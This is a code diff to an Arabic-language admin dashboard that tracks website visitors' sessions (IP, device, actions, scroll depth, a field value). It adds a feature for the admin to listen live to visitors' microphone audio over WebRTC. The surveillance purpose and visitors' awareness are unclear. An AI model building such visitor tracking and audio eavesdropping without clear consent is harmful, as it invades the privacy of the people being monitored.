@@ -323,6 +323,34 @@
 
     .session-field.visible { display: block; }
 
+    .session-voice {
+      margin-top: 6px;
+      border: 1px solid rgba(20,184,166,0.35);
+      color: #99f6e4;
+      background: rgba(20,184,166,0.1);
+      padding: 4px 8px;
+      border-radius: 6px;
+      font-size: 0.74rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+    }
+
+    .session-voice button {
+      border: none;
+      border-radius: 6px;
+      background: rgba(20,184,166,0.22);
+      color: #ccfbf1;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 0.72rem;
+      font-weight: 700;
+      padding: 3px 8px;
+      white-space: nowrap;
+    }
+
     .empty-state {
       text-align: center;
       padding: 60px 20px;
@@ -633,8 +661,10 @@
   let selectedSid   = null;
   let eventsUnsub   = null;
   let sessionsUnsub = null;
+  let audioUnsub    = null;
   let knownSids     = new Set();
   let sessions      = {};   // sid → data
+  let audioSessions = {};
 
   const RTC_CONFIG = {
     iceServers: [{ urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }]
@@ -790,6 +820,7 @@
       await unlockAudio();
       updateSoundBtn();
       startListening();
+      startAudioListening();
     } catch {
       errEl.style.display = 'block';
     }
@@ -815,6 +846,7 @@
     // الصوت يحتاج تفاعل — يُفعَّل عند أول ضغط على زر الصوت
     updateSoundBtn();
     startListening();
+    startAudioListening();
   }
 
   // ── Helpers ────────────────────────────────────────────────
@@ -841,6 +873,13 @@
 
   function actionLabel(action) {
     return EVENT_LABELS[action] || action || '';
+  }
+
+  function audioStatusLabel(status) {
+    if (status === 'connected') return 'الأدمن يستمع الآن';
+    if (status === 'waiting_admin') return 'بث صوتي مفتوح';
+    if (status === 'disconnected') return 'انقطع البث الصوتي';
+    return 'بث صوتي';
   }
 
   function fmtTime(ts) {
@@ -879,6 +918,13 @@
         ? `${actionLabel(d.lastAction)}${d.scrollDepth ? ` · ${d.scrollDepth}%` : ''}`
         : '';
       const action = actionText ? `<div class="session-field visible">⚡ ${escHtml(actionText)}</div>` : '';
+      const audio = audioSessions[sid];
+      const voice = audio && !['ended', 'ended_by_visitor', 'permission_denied', 'admin_stopped'].includes(audio.status)
+        ? `<div class="session-voice">
+             <span>🎙 ${escHtml(audioStatusLabel(audio.status))}</span>
+             <button type="button" onclick="listenToSessionVoice(event, '${sid}')">استماع</button>
+           </div>`
+        : '';
       const sel     = sid === selectedSid ? 'selected' : '';
       return `
         <div class="session-card ${sel}" onclick="selectSession('${sid}')">
@@ -893,6 +939,7 @@
           </div>
           ${field}
           ${action}
+          ${voice}
           <div class="session-card-actions">
             <button class="session-delete" type="button" title="حذف الجلسة" onclick="deleteSession(event, '${sid}')">🗑 حذف الجلسة</button>
           </div>
@@ -947,11 +994,26 @@
     if (adminVoicePc && adminVoiceSid === selectedSid) {
       btn.textContent = '🔴 إنهاء الاستماع';
       btn.classList.add('live');
+    } else if (selectedSid && audioSessions[selectedSid]?.offer) {
+      btn.textContent = '🎧 استماع للبث المفتوح';
+      btn.classList.add('live');
     } else {
       btn.textContent = '🎧 استماع مباشر';
       btn.classList.remove('live');
     }
   }
+
+  window.listenToSessionVoice = async (e, sid) => {
+    if (e) {
+      e.preventDefault();
+      e.stopPropagation();
+    }
+    selectedSid = sid;
+    renderSessions();
+    loadEvents(sid);
+    updateVoiceListenBtn();
+    await window.toggleAdminVoice();
+  };
 
   function stopAdminVoice(status = 'admin_stopped') {
     adminVoiceUnsubs.forEach(unsub => {
@@ -1003,6 +1065,8 @@
         const audio = document.getElementById('liveAudio');
         if (!audio) return;
         audio.srcObject = e.streams[0];
+        audio.muted = false;
+        audio.volume = 1;
         audio.play().catch(() => showNotif('اضغط استماع مرة أخرى لتشغيل الصوت'));
       };
 
@@ -1011,7 +1075,9 @@
       };
 
       adminVoicePc.onconnectionstatechange = () => {
-        if (['failed', 'disconnected', 'closed'].includes(adminVoicePc?.connectionState)) {
+        const state = adminVoicePc?.connectionState;
+        if (state === 'connected') showNotif('تم تشغيل البث الصوتي');
+        if (['failed', 'disconnected', 'closed'].includes(state)) {
           stopAdminVoice('disconnected');
         }
       };
@@ -1046,7 +1112,7 @@
       showNotif('جارٍ الاتصال بالبث الصوتي...');
     } catch (err) {
       stopAdminVoice('admin_error');
-      showNotif('تعذر تشغيل البث الصوتي');
+      showNotif(`تعذر تشغيل البث الصوتي${err?.code ? ` — ${err.code}` : ''}`);
     }
   };
 
@@ -1156,6 +1222,24 @@
         document.getElementById('eventsTitle').textContent    = d.ip || selectedSid;
         document.getElementById('eventsSubtitle').textContent = `${d.browser || ''} · ${d.os || ''} · ${d.screenRes || ''}`;
       }
+    });
+  }
+
+  function startAudioListening() {
+    if (audioUnsub) return;
+    audioUnsub = onSnapshot(collection(db, 'LiveAudio'), snap => {
+      snap.docChanges().forEach(change => {
+        const sid = change.doc.id;
+        if (change.type === 'removed') {
+          delete audioSessions[sid];
+        } else {
+          audioSessions[sid] = change.doc.data();
+        }
+      });
+      renderSessions();
+      updateVoiceListenBtn();
+    }, () => {
+      showNotif('تعذر قراءة حالة البث الصوتي — تحقق من صلاحيات LiveAudio');
     });
   }
 
